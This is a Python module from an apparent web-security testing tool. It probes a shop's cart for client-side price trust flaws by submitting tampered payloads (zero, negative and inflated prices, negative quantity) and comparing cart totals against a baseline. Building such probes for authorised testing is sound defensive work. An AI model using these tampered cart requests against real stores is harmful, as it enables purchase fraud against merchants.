from core.requester import Requester
from core.parser import Parser


class ClientSideTrustExploit:
    """
    Detects client-side price/quantity trust vulnerabilities by
    submitting manipulated cart payloads and comparing totals.
    """

    def __init__(self, session, config: dict):
        self.requester = Requester(session, config)
        self.parser = Parser()

    # ------------------------------------------------------------------
    # Payloads (baseline is handled separately in run())
    # ------------------------------------------------------------------
    def generate_payloads(self) -> list[dict]:
        return [
            {"productId": "1", "redir": "PRODUCT", "quantity": "1", "price": "0"},
            {"productId": "1", "redir": "PRODUCT", "quantity": "1", "price": "-1"},
            {"productId": "1", "redir": "PRODUCT", "quantity": "1", "price": "999999"},
            {"productId": "1", "redir": "PRODUCT", "quantity": "-5", "price": "10"},
        ]

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------
    def get_cart_total(self) -> str | None:
        r = self.requester.get_cart()
        return self.parser.extract_total(r.text) if r else None

    def analyze_response(self, payload: dict, baseline_total: str) -> bool:
        current_total = self.get_cart_total()

        print(f"[DEBUG] Baseline : {baseline_total}")
        print(f"[DEBUG] Current  : {current_total}")

        if current_total is None:
            print("[-] Could not read current total — skipping comparison")
            return False

        if current_total != baseline_total:
            print(f"[!!!] Total changed: {baseline_total} → {current_total}  |  payload: {payload}")
            return True

        has_negative = any(str(v).lstrip().startswith("-") for v in payload.values())
        if has_negative:
            print("[!!!] Negative value accepted without error — possible validation bypass")
            return True

        return False

    # ------------------------------------------------------------------
    # Runner
    # ------------------------------------------------------------------
    def run(self):
        print("[+] Starting Client Trust Exploit Module")

        # Baseline
        self.requester.clear_cart()
        baseline_payload = {"productId": "1", "redir": "PRODUCT", "quantity": "1", "price": "100"}
        r = self.requester.add_to_cart(baseline_payload)

        if not r:
            print("[-] Could not establish baseline")
            return

        baseline_total = self.get_cart_total()
        print(f"[+] Baseline total: {baseline_total}")

        # Test payloads
        vulnerable = False
        for payload in self.generate_payloads():
            print(f"\n[+] Testing payload: {payload}")
            self.requester.clear_cart()
            self.requester.add_to_cart(payload)

            if self.analyze_response(payload, baseline_total):
                print("[!!!] Potential client-side trust vulnerability detected")
                vulnerable = True

        print()
        if vulnerable:
            print("[+] Summary: Target appears VULNERABLE to client-side price manipulation")
        else:
            print("[-] Summary: No obvious client-side trust vulnerability detected")